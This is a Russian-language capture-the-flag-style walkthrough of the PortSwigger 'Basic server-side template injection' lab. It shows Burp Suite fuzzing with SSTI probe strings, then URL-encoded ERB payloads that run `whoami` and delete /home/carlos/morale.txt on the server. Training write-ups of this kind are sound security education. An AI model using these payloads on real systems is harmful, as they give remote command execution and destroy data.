Перейдем на уязвимый ресурс 

и попробуем получим информацию о любом из товаров, и получаем надпись `Unfortunately this product is out of stock`

Перейдем в `Proxy` -> `HTTP history` и найдем запрос 
```
GET /?message=Unfortunately%20this%20product%20is%20out%20of%20stock 
```

![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/22.%20Server-side%20template%20injection%20(SSTI)/1.%20Basic%20server-side%20template%20injection/pics%20for%20walkthrough/1.png)

Оправим данный запрос в `intruder`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/22.%20Server-side%20template%20injection%20(SSTI)/1.%20Basic%20server-side%20template%20injection/pics%20for%20walkthrough/2.png)

Далее попробуем посмотреть на ответы на пул SSTI, которые могут свидетельствовать о ее наличии. пул кстати, вот
```
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
```

и в` Grep - Extract` выберем те `<div>` в которых мы ожидаем увидеть результат выполнения атаки
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/22.%20Server-side%20template%20injection%20(SSTI)/1.%20Basic%20server-side%20template%20injection/pics%20for%20walkthrough/3.png)

запустим

и увидим, что именно с `%3c%%3d%207%2a7%20%%3e` (это в URL кодировке `<%= 7*7 %>`) будет число `49`, что будет означать успешную эксплуатацию SSTI

Отправим оргинальный запрос в `Repeater` и попробуем узнать имя пользователя под которым работает ресурс
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/22.%20Server-side%20template%20injection%20(SSTI)/1.%20Basic%20server-side%20template%20injection/pics%20for%20walkthrough/4.png)

Но сначала давайте перейдем в Decoder и сконфигурируем необходимый пэйлоад для SSTI
```
<%= system("whoami") %>
```
Выберем `Encode as URL` и получим
```
%3c%25%3d%20%73%79%73%74%65%6d%28%22%77%68%6f%61%6d%69%22%29%20%25%3e
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/22.%20Server-side%20template%20injection%20(SSTI)/1.%20Basic%20server-side%20template%20injection/pics%20for%20walkthrough/5.png)
и вставим результат как
```
GET /?message=%3c%25%3d%20%73%79%73%74%65%6d%28%22%77%68%6f%61%6d%69%22%29%20%25%3e
```
и увидим, что мы находимся под УЗ `carlos`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/22.%20Server-side%20template%20injection%20(SSTI)/1.%20Basic%20server-side%20template%20injection/pics%20for%20walkthrough/6.png)

Аналогично с прошлым шагов вернемся в Decoder и изменим пэйлоад на 
```
<%= system("rm /home/carlos/morale.txt") %>
```
и в Repeater передадим значение 
```
GET /?message=%3c%25%3d%20%73%79%73%74%65%6d%28%22%72%6d%20%2f%68%6f%6d%65%2f%63%61%72%6c%6f%73%2f%6d%6f%72%61%6c%65%2e%74%78%74%22%29%20%25%3e 
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/22.%20Server-side%20template%20injection%20(SSTI)/1.%20Basic%20server-side%20template%20injection/pics%20for%20walkthrough/7.png)

и получим уведомление об успешно выполненной лабораторной работе
